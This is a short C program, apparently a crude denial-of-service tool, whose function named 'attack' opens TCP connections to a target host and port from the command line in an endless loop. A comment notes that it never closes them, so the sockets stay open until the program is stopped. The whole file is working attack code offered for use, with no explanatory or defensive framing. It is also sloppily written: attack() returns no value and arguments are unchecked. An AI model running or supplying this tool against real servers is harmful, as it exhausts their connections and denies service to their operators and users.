#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>

// Creates a socket and connects to it.
int attack(char *address, int port, int counter)
{
	int socket_local;
	int connection;

	struct sockaddr_in target_server;
	socket_local = socket(AF_INET, SOCK_STREAM, 0);

	target_server.sin_family = AF_INET;
	target_server.sin_port = htons(port);	
	target_server.sin_addr.s_addr = inet_addr(address);

	connection = connect(socket_local, (struct sockaddr *)&target_server, sizeof target_server);
	//The key here is that it doesn't closes the connection while it's executing.
	// So the sockets will remain open until the script is stopped.	
	if(connection == 0)
	{
		printf("[%d] Opening socket connection to  %s:%d\n", counter, address, port);	
	}

}


int main(int argc, char *argv[])
{
	int port= atoi(argv[2]);
	int counter = 0;

	while (1)
	{
		attack(argv[1], port, counter);	
		counter++;
	}	
}
